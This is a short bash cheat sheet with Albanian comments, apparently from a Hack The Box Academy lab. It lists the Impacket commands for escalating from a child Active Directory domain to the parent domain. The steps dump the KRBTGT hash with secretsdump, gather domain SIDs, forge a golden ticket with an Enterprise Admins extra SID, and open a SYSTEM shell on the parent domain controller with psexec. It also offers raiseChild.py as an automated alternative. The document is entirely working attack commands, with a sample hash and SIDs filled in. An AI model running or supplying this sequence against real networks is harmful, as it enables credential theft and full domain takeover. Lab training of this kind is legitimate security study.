```bash
# 1. Marrja e KRBTGT hash (Child)
secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt

# 2. Marrja e SID të domenit (Child)
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"

# 3. Marrja e SID të Enterprise Admins (Parent)
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"

# 4. Ndërtimi i Golden Ticket
ticketer.py -nthash 9d765b482771505cbe97411065964d5f \\
-domain LOGISTICS.INLANEFREIGHT.LOCAL \\
-domain-sid S-1-5-21-2806153819-209893948-922872689 \\
-extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 \\
hacker

# 5. Përdorimi i ticket-it
export KRB5CCNAME=hacker.ccache

# 6. Marrja e shell SYSTEM tek DC i prindit
psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5

# 7. Opsion automatik (jo i rekomanduar)
raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm

```